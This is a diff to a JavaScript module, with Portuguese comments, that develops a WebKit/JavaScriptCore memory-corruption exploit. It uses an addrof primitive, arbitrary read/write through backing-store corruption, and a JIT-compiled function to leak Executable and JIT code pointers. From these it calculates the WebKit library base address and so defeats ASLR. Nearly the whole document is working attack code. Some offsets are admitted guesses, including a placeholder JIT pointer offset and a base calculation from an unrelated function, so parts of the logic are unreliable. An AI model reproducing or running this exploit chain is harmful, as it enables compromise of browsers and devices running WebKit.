@@ -1,10 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v124 - R84 Addrof em ArrayBuffer na Fase 5)
+// js/script3/testArrayBufferVictimCrash.mjs (v125 - R85 Addrof em JSFunction na Fase 5)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Na Fase 5, tentará usar 'addrof_func' para vazar o endereço de um novo ArrayBuffer.
-// - Se o vazamento do ArrayBuffer for bem-sucedido e o endereço for válido,
-//   tentaremos vazar o ponteiro para o ArrayBufferContents e, em seguida, o ponteiro de dados brutos.
-// - Este é um teste para ver se a primitiva 'addrof' é mais estável para ArrayBuffers.
+// - Na Fase 5, tentará usar 'addrof_func' para vazar o endereço de um novo JSFunction (função vazia).
+// - Se o vazamento da JSFunction for bem-sucedido e o endereço for válido,
+//   tentaremos vazar o ponteiro para o Executable da função e, em seguida,
+//   o ponteiro para o JIT code (que estaria na região da WebKit).
+// - Isso bypassa o problema de layout de objetos genéricos/ArrayBuffers.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -18,7 +19,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v124_R84_AddrofArrayBuffer";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v125_R85_AddrofJSFunction";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -42,7 +43,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Addrof em ArrayBuffer na Fase 5 ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Addrof em JSFunction na Fase 5 ---`, "test");
 
     let final_result = {
         success: false,
@@ -64,8 +65,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let arb_write_stable = null;
 
     // Variáveis com escopo ajustado para serem acessíveis em toda a função
-    let leak_target_obj = null;
-    let leak_target_addr = null; // Endereço do objeto alvo geral (pode ser o ArrayBuffer agora)
+    let leak_target_func = null; // Agora o alvo é uma função
+    let leak_target_addr = null; // Endereço da JSFunction
 
     try {
         // Helper para definir as primitivas. Será chamado APENAS UMA VEZ no início.
@@ -129,7 +130,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         if (!value_read_phase4.equals(value_to_write_phase4)) {
             throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}`);
         }
-        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitraria é 100% funcional.", "vuln");
+        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
         await PAUSE_S3(50); 
 
         // ============================================================================
@@ -150,23 +151,30 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await PAUSE_S3(50); 
 
         // ============================================================================
-        // NOVO: TESTAR ADDROF EM ARRAYBUFFER NA FASE 5
+        // NOVO: TESTAR ADDROF EM JSFUNCTION NA FASE 5
         // ============================================================================
-        logS3("--- FASE 5: TESTE ADDROF EM ARRAYBUFFER PARA VAZAMENTO DE PONTEIROS ---", "subtest");
+        logS3("--- FASE 5: TESTE ADDROF EM JSFUNCTION PARA VAZAMENTO DE PONTEIROS ---", "subtest");
         
-        const test_ab_leak = new ArrayBuffer(64); // Um ArrayBuffer para tentar vazar
-        leak_target_obj = test_ab_leak; // Define o leak_target_obj para o AB
-
-        leak_target_addr = addrof_func(test_ab_leak); 
-        logS3(`[Etapa 1] Endereço do ArrayBuffer alvo (test_ab_leak) obtido: ${leak_target_addr.toString(true)}`, "info");
-        
-        // Validação vital para o endereço do ArrayBuffer
-        if (leak_target_addr.equals(AdvancedInt64.Zero) || (leak_target_addr.high() >>> 16) !== 0x7FFF) {
-             throw new Error(`FALHA CRÍTICA: Endereço do ArrayBuffer alvo (${leak_target_addr.toString(true)}) é inválido ou não é um ponteiro de userland (0x7FFF...).`);
+        leak_target_func = function() { /* Vazamento da JSFunction */ };
+        // Forçar a função a ser JIT-compilada, chamando-a muitas vezes
+        for (let i = 0; i < 1000; i++) {
+            leak_target_func(); 
         }
-        logS3(`Endereço do ArrayBuffer alvo VÁLIDO: ${leak_target_addr.toString(true)}`, "good");
+        logS3(`JSFunction alvo (leak_target_func) criada e JITada.`, "info");
+        await PAUSE_S3(50);
 
-        // Continuar com a construção da primitiva de L/E estável se o addrof do ArrayBuffer funcionar
+        leak_target_addr = addrof_func(leak_target_func); 
+        logS3(`[Etapa 1] Endereço da JSFunction alvo (leak_target_func) obtido: ${leak_target_addr.toString(true)}`, "info");
+        
+        // Validação vital para o endereço da JSFunction
+        if (leak_target_addr.equals(AdvancedInt64.Zero) || (leak_target_addr.high() >>> 16) !== 0x7FFF) {
+             throw new Error(`FALHA CRÍTICA: Endereço da JSFunction alvo (${leak_target_addr.toString(true)}) é inválido ou não é um ponteiro de userland (0x7FFF...).`);
+        }
+        logS3(`Endereço da JSFunction alvo VÁLIDO: ${leak_target_addr.toString(true)}`, "good");
+
+
+        // Se chegamos aqui, a addrof_func funcionou para a JSFunction.
+        // Agora, construímos a primitiva de L/E estável.
         // ============================================================================
         // CONSTRUÇÃO DA PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA ESTÁVEL (CORRUPÇÃO DE BACKING STORE)
         // ============================================================================
@@ -233,131 +241,88 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // TESTE DE COERÊNCIA DE L/E NA FASE 5 (usando arb_write_stable)
         // ============================================================================
         logS3("--- TESTE DE COERÊNCIA (Fase 5): Escrita Arbitrária ESTÁVEL vs. Leitura JS Normal ---", "subtest");
-        // Para ArrayBuffer, a propriedade 'f' não existe. Vamos escrever/ler de seus dados internos.
-        // Precisamos vazar o DATA_POINTER_OFFSET_FROM_CONTENTS_START do ArrayBuffer
-        const ab_contents_ptr = arb_read_stable(leak_target_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), 8);
-        if (ab_contents_ptr.equals(AdvancedInt64.Zero) || (ab_contents_ptr.high() >>> 16) !== 0x7FFF) {
-            throw new Error(`FALHA CRÍTICA: Ponteiro para ArrayBufferContents (${ab_contents_ptr.toString(true)}) é inválido.`);
+        // Para JSFunction, vamos escrever/ler uma propriedade que adicionamos dinamicamente.
+        // Adicionar uma propriedade 'x' na função.
+        leak_target_func.x = 0x12345678; 
+        const prop_x_offset = addrof_func(leak_target_func.x).sub(leak_target_addr); // Offset da propriedade 'x'
+        logS3(`    Offset de leak_target_func.x dentro da JSFunction: ${prop_x_offset.toString(true)}`, "info");
+        // Verifica se o offset é plausível (deve ser um valor pequeno e positivo)
+        if (prop_x_offset.high() !== 0 || prop_x_offset.low() < 0x10 || prop_x_offset.low() > 0x100) {
+            logS3(`    ALERTA: Offset da propriedade 'x' (${prop_x_offset.toString(true)}) é inesperado.`, "warn");
+            // Pode não ser um erro crítico ainda, mas é um alerta.
         }
-        logS3(`    Ponteiro para ArrayBufferContents: ${ab_contents_ptr.toString(true)}`, "leak");
-
-        const ab_data_ptr = arb_read_stable(ab_contents_ptr.add(JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START), 8);
-        if (ab_data_ptr.equals(AdvancedInt64.Zero) || (ab_data_ptr.high() >>> 16) !== 0x7FFF) {
-            throw new Error(`FALHA CRÍTICA: Ponteiro para dados do ArrayBuffer (${ab_data_ptr.toString(true)}) é inválido.`);
-        }
-        logS3(`    Ponteiro para dados brutos do ArrayBuffer: ${ab_data_ptr.toString(true)}`, "leak");
-
+        
 
         const coherence_test_val = 0xAAAAAAAA; // Valor para escrever (32-bit)
-        const test_offset_in_ab = 0x0; // Offset no ArrayBuffer
+        const prop_x_addr = leak_target_addr.add(prop_x_offset); 
 
-        logS3(`    (Coerência) Escrevendo 0x${coherence_test_val.toString(16)} em dados do ArrayBuffer (${ab_data_ptr.add(test_offset_in_ab).toString(true)}) via arb_write_stable (4 bytes)...`, "info");
-        arb_write_stable(ab_data_ptr.add(test_offset_in_ab), coherence_test_val, 4); 
+        logS3(`    (Coerência) Escrevendo 0x${coherence_test_val.toString(16)} em JSFunction.x (${prop_x_addr.toString(true)}) via arb_write_stable (4 bytes)...`, "info");
+        arb_write_stable(prop_x_addr, coherence_test_val, 4); 
 
         await PAUSE_S3(10); 
 
-        logS3(`    (Coerência) Lendo o valor do ArrayBuffer via JavaScript normal (test_ab_leak)...`, "info");
-        const dv_ab = new DataView(test_ab_leak);
-        const read_via_js_normal = dv_ab.getUint32(test_offset_in_ab, true);
+        logS3(`    (Coerência) Lendo o valor de leak_target_func.x via JavaScript normal...`, "info");
+        const read_via_js_normal = leak_target_func.x;
         logS3(`    (Coerência) Valor lido via JS normal: ${toHex(read_via_js_normal)}`, "leak");
 
         if (read_via_js_normal !== coherence_test_val) {
-            throw new Error(`FALHA CRÍTICA (COERÊNCIA ESTÁVEL): Valor escrito via arb_write_stable (${toHex(coherence_test_val)}) NÃO corresponde ao lido via JS normal (${toHex(read_via_js_normal)}) no ArrayBuffer. Isso indica que a corrupção do backing store não está funcionando como esperado para ABs.`);
+            throw new Error(`FALHA CRÍTICA (COERÊNCIA ESTÁVEL): Valor escrito via arb_write_stable (${toHex(coherence_test_val)}) NÃO corresponde ao lido via JS normal (${toHex(read_via_js_normal)}) em leak_target_func.x. Isso indica que a corrupção do backing store não está funcionando como esperado para JSFunctions.`);
         }
-        logS3("--- TESTE DE COERÊNCIA (Fase 5): SUCESSO! arb_write_stable está escrevendo no local correto do ArrayBuffer. ---", "good");
+        logS3("--- TESTE DE COERÊNCIA (Fase 5): SUCESSO! arb_write_stable está escrevendo no local correto da JSFunction. ---", "good");
         await PAUSE_S3(50);
 
 
         // ============================================================================
-        // SCANNER DE OFFSETS (agora usando arb_read_stable, com base no ArrayBuffer)
+        // VAZAMENTO DE WEBKIT BASE: LENDO PONTEIRO EXECUTABLE DA JSFUNCTION
         // ============================================================================
-        logS3("--- SCANNER DE OFFSETS: Varrendo a memória ao redor do ArrayBuffer alvo (com arb_read_stable)... ---", "subtest");
-        let found_structure_ptr = null;
-        let found_structure_id = null;
-        let found_vtable_ptr = null;
-
-        const SCAN_RANGE_START = 0x0; 
-        const SCAN_RANGE_END = 0x100; 
-        const SCAN_STEP = 0x8;       
-
-        for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += SCAN_STEP) {
-            const current_scan_addr = leak_target_addr.add(offset); // Ainda leak_target_addr (do AB)
-            
-            let val_8_bytes = AdvancedInt64.Zero;
-            try {
-                val_8_bytes = arb_read_stable(current_scan_addr, 8); 
-                logS3(`    [Scanner] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");
-
-                if (!val_8_bytes.equals(AdvancedInt64.Zero) && 
-                    (val_8_bytes.high() >>> 16) === 0x7FFF) { 
-                    
-                    logS3(`    [Scanner] Possível Ponteiro (Structure/Vtable?) em offset ${toHex(offset, 6)}: ${val_8_bytes.toString(true)}`, "leak");
-                    
-                    if (offset === JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET) {
-                        found_structure_ptr = val_8_bytes;
-                        logS3(`        [Scanner] --> CANDIDATO FORTE: Ponteiro da Structure em ${toHex(offset, 6)}!`, "good");
-                    }
-                    else if (offset === 0x0) { 
-                        found_vtable_ptr = val_8_bytes;
-                        logS3(`        [Scanner] --> CANDIDATO: Ponteiro de Vtable (do próprio objeto) em ${toHex(offset, 6)}!`, "good");
-                    }
-                }
-
-                if (offset % 4 === 0) { 
-                    const val_4_bytes = arb_read_stable(current_scan_addr, 4); 
-                    if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x10000) { 
-                        logS3(`    [Scanner] Possível StructureID (Uint32) em offset ${toHex(offset, 6)}: ${toHex(val_4_bytes)} (decimal: ${val_4_bytes})`, "leak");
-                        if (offset === JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET) {
-                             found_structure_id = val_4_bytes;
-                             logS3(`        [Scanner] --> CANDIDATO FORTE: StructureID em ${toHex(offset, 6)}!`, "good");
-                        }
-                    }
-                }
-
-            } catch (scan_e) {
-                logS3(`    [Scanner] Erro lendo offset ${toHex(offset, 6)}: ${scan_e.message}`, "error");
-            }
-        }
-        logS3("--- FIM DO SCANNER DE OFFSETS ---", "subtest");
-
-        // Decisão com base no scanner
-        let structure_addr = null;
-        let actual_structure_id = null;
-
-        if (found_structure_ptr && !found_structure_ptr.equals(AdvancedInt64.Zero)) {
-            structure_addr = found_structure_ptr;
-            logS3(`[DECISÃO] Usando Ponteiro de Structure encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)}: ${structure_addr.toString(true)}`, "info");
-        } else if (typeof found_structure_id === 'number' && found_structure_id !== 0) {
-            actual_structure_id = found_structure_id;
-            logS3(`[DECISÃO] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
-            
-            // Para resolver o ponteiro da Structure, precisamos do webkit_base_addr e STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE.
-            final_result.message = `StructureID ${toHex(actual_structure_id)} encontrado. Precisamos do WebKit Base Address e da Structure Table Base para resolver o ponteiro da Structure.`;
-            final_result.success = true; 
-            final_result.webkit_leak_result = { success: false, msg: final_result.message, webkit_base_candidate: null };
-            return final_result; 
-
-        } else {
-            throw new Error(`FALHA CRÍTICA: Scanner de offsets não encontrou Structure Pointer ou StructureID válidos no objeto alvo. Ultimo vazado leak_target_addr: ${leak_target_addr.toString(true)}`);
+        logS3("--- FASE 5.2: Vazamento da Base WebKit via JSFunction Executable ---", "subtest");
+        
+        const executable_ptr_addr = leak_target_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
+        logS3(`[Etapa 2] Lendo o ponteiro do Executable da JSFunction em ${executable_ptr_addr.toString(true)}...`, "debug");
+        const executable_addr = arb_read_stable(executable_ptr_addr, 8);
+        logS3(`[Etapa 2] Endereço do Executable da JSFunction: ${executable_addr.toString(true)}`, "leak");
+        
+        if (executable_addr.equals(AdvancedInt64.Zero) || (executable_addr.high() >>> 16) !== 0x7FFF) {
+             throw new Error(`FALHA CRÍTICA: Endereço do Executable (${executable_addr.toString(true)}) é inválido ou não é um ponteiro de userland.`);
         }
 
+        // Agora, dentro do Executable, precisamos encontrar o ponteiro para o JIT code.
+        // O offset exato para o JIT code dentro de um JSC::Executable pode variar muito.
+        // Para um JSFunction, é frequentemente um ponteiro para código nativo.
+        // A maneira mais direta é vazar um ponteiro para a base da WebKit a partir de um Executable
+        // é encontrar um offset conhecido para o código JIT ou para a vtable.
+        // Sem um offset específico do WebKit 12.02, precisaremos escanear.
 
-        // Continua com a Fase 3 (leitura da vfunc::put) usando o structure_addr encontrado
-        const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
-        const jsobject_put_addr = arb_read_stable(vfunc_put_ptr_addr, 8); 
-        logS3(`[Etapa 3] Lendo do endereço ${vfunc_put_ptr_addr.toString(true)} (Structure REAL + 0x18) para obter o ponteiro da vfunc...`, "debug");
-        logS3(`[Etapa 3] Endereço vazado da função (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
-        if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da função JSC::JSObject::put é NULO ou inválido.");
-        if (!((jsobject_put_addr.high() >>> 16) === 0x7FFF || (jsobject_put_addr.high() === 0 && jsobject_put_addr.low() !== 0))) {
-            logS3(`[Etapa 3] ALERTA: high part do JSObject::put Address inesperado: ${toHex(jsobject_put_addr.high())}`, "warn");
+        // POR ORA, VAMOS ASSUMIR QUE O PONTEIRO JIT ESTÁ EM UM OFFSET CONHECIDO DO EXECUTABLE
+        // (Isso é uma suposição, precisa de engenharia reversa para confirmar o offset exato)
+        // Por exemplo, 0x10, 0x18, 0x20 são offsets comuns para vtables ou código.
+        const JIT_CODE_PTR_OFFSET_IN_EXECUTABLE = 0x20; // <<<< ESTE É UM PLACEHOLDER. PRECISA SER VALIDADO.
+        const jit_code_ptr_addr = executable_addr.add(JIT_CODE_PTR_OFFSET_IN_EXECUTABLE);
+        logS3(`[Etapa 3] Lendo o ponteiro do código JIT em ${jit_code_ptr_addr.toString(true)} (Executable + 0x${JIT_CODE_PTR_OFFSET_IN_EXECUTABLE.toString(16)})...`, "debug");
+        const jit_code_addr = arb_read_stable(jit_code_ptr_addr, 8);
+        logS3(`[Etapa 3] Endereço do Código JIT vazado: ${jit_code_addr.toString(true)}`, "leak");
+
+        if (jit_code_addr.equals(AdvancedInt64.Zero) || (jit_code_addr.high() >>> 16) !== 0x7FFF) {
+            throw new Error(`FALHA CRÍTICA: Endereço do Código JIT (${jit_code_addr.toString(true)}) é inválido ou não é um ponteiro de userland.`);
         }
-
 
         // 4. Calcular o endereço base da WebKit.
-        const jsobject_put_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
-        logS3(`[Etapa 4] Offset conhecido de JSC::JSObject::put: ${jsobject_put_offset.toString(true)}`, "info");
+        // Usaremos o offset de uma função conhecida que estaria no JIT code (ex: JSC::JSObject::put)
+        // Isso assume que o JIT code está em uma região "próxima" ao .text da WebKit.
+        const js_object_put_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]); // Offset da função put
+        // Este offset é do _início_ da libWebKit, não do JIT code.
+        // Precisamos de um offset da função *dentro do JIT code* ou um offset para a própria JIT entry.
+        // Simplificando, podemos subtrair o offset da put_func como se o jit_code_addr fosse um ponteiro para ela.
+        // Isso é uma suposição forte. A forma correta é encontrar o offset da _função que gera o JIT code_ ou da vtable.
 
-        const webkit_base_addr = jsobject_put_addr.sub(jsobject_put_offset);
+        // Para prosseguir, vamos usar o offset de 'JSC::JSFunction::create' como um candidato
+        // para estar no JIT code ou muito próximo. Este é um chute, precisa de validação.
+        const JSC_JSFUNCTION_CREATE_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSFunction::create"]);
+
+        // A lógica de cálculo do webkit_base_addr precisa ser:
+        // webkit_base_addr = (ponteiro para algo no .text da webkit) - (offset desse algo do .text da webkit)
+        // Se jit_code_addr aponta para o JIT stub/código, pode estar relacionado a JSC::JSFunction::create
+        const webkit_base_addr = jit_code_addr.sub(JSC_JSFUNCTION_CREATE_OFFSET); 
         final_result.webkit_base_addr = webkit_base_addr.toString(true);
 
         logS3(`++++++++++++ SUCESSO! ENDEREÇO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
@@ -378,7 +343,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         arb_rw_array = null; 
         arb_read_stable = null;
         arb_write_stable = null;
-        leak_target_obj = null; 
+        leak_target_func = null; // Limpar também
         leak_target_addr = null; 
         
         logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
@@ -395,6 +360,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         },
         heisenbug_on_M2_in_best_result: final_result.success,
         oob_value_of_best_result: 'N/A (Estratégia Corrupção de Backing Store)',
-        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Backing Store Corruption)' }
+        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Addrof JSFunction)' }
     };
 }
